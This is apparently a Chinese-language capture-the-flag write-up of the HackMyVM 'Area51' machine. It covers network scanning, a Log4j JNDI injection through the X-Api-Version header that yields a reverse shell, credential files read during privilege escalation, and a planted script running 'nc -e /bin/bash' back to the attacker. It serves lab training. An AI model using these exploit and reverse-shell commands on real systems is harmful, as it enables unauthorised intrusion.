> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vMOVkaGYgjgQ3RBXJsGTwg)

### 靶机信息

```
靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Area51
```

名称：Area51(51区)

难度：中等

创作者：bit

发布日期：2021-12-24

目标：user.txt和root.txt

### 搭建靶机

下载完Area51.ova后，使用Oracle VM VirtualBox导入即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqd1TjczRGJ93fAObZUQQlm1MAmjFmFDHj9rlmRsKrKKdLTIicnkPrTJBV0LicMC0ghb3QEVUd4MtSQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

导入时注意！！不要勾上USB控制器，不然会出错  

![图片](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqd1TjczRGJ93fAObZUQQlmQyd7bkiaQ9FAnQ4tFmqcWY6Oj8vlvyicTBcn0OESyDTicI4EE6dziaSM3Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

导入完成后，直接启动即可，就可以开始靶机之旅  

### 实验环境

```
攻击机：VMware Kali 192.168.2.148  
目标机：VirtualBox Debian IP自动获取
```

### 信息收集

扫描局域网内的靶机IP地址

```
nmap -sn 192.168.2.0/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

端口扫描，扫描目标机器所开放的服务  

```
nmap -A -p- 192.168.2.108
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到22(SSH)、80(HTTP)、8080(HTTP)三个端口，使用火狐浏览器访问80端口，192.168.2.108  

好家伙佛波乐(FBI)页面，访问下8080端口，192.168.2.108:8080

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现是一个400报错页面  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

目录扫描，扫描一些敏感文件之类的，使用gobuster来扫描  

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.2.108/ -x php,html,txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到一个note.txt，访问下192.168.2.108/note.txt  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

翻译看看  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 渗透测试  

提示存在Log4j漏洞，猜测到很有可能跟8080端口有关，直接访问，使用Burp的插件log4j扫描看看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现X-Api-Version：参数存在漏洞  

存在log4j漏洞，使用poc(https://github.com/kozmer/log4j-shell-poc)拿shell

在kali机器中，log4j-shell-poc目录下必须有jdk1.8.0_20文件夹的java

(https://repo.huaweicloud.com/java/jdk/8u201-b09/jdk-8u201-linux-x64.tar.gz)

```
git clone https://github.com/kozmer/log4j-shell-poc.git  
cd log4j-shell-poc  
python3 poc.py --userip 192.168.2.148
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

新开一个终端页面开启监听  

```
nc -nvlp 9001
```

再新开一个终端页面，输入刚刚的payload

```
curl 'http://192.168.2.108:8080' -H 'X-Api-Version: ${jndi:ldap://192.168.2.148:1389/a}'
```

监听这边的终端就收到了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现是在docker里面，上传一个linpeas.sh搜集下信息  

kali机器下载好linpeas.sh，新开一个终端页面开启远程下载服务

```
python3 -m http.server 7788
```

监听这边的终端页面执行下载linpeas.sh

```
wget http://192.168.2.148:7788/linpeas.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

执行linpeas.sh信息收集  

```
chmod +x linpeas.sh  
./linpeas.sh
```

发现一些目录查看下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
cat /var/tmp/.roger，查询到roger的密码  
使用ssh远程登录  
ssh roger@192.168.2.108  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到user.txt下的一个FLAG=[xxxxxx]  

继续使用linpeas.sh搜集信息

```
wget http://192.168.2.148:7788/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现了roger下有个kang  

```
cat /etc/pam.d/kang，发现是kang的密码  
su kang
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现kang的主目录发生了一些奇怪的事情，一个文件不断出现并消失  

看起来像是kang用户创建了一个shell脚本，执行所有的.sh文件并删除它们

```
echo "echo test >/tmp/test" > test.sh  
ls /tmp/test -l  
echo "nc -e /bin/bash 192.168.2.148 4444" >test.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

新开一个终端页面开启监听  

```
nc -nvlp 4444  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
cd root  
cat root.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

成功获取到root权限下的FLAG=[xxxxx]  

          欢迎大家的点赞与转发。祝大家新年快乐，开工大吉！！！！！

 ![](http://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqKCK7LiayIC9huFRNNpFypRfxehNOAo67W1EIOVJJfWQMXSMNmXtd9D0GjeLaRxG6GcfDCnlMQq0Q/0?wx_fmt=png) ** 亿人安全 ** 知其黑，守其白。手握利剑，心系安全。主要研究方向包括：Web、内网、红蓝对抗、代码审计、安卓逆向、CTF系统。 63篇原创内容   公众号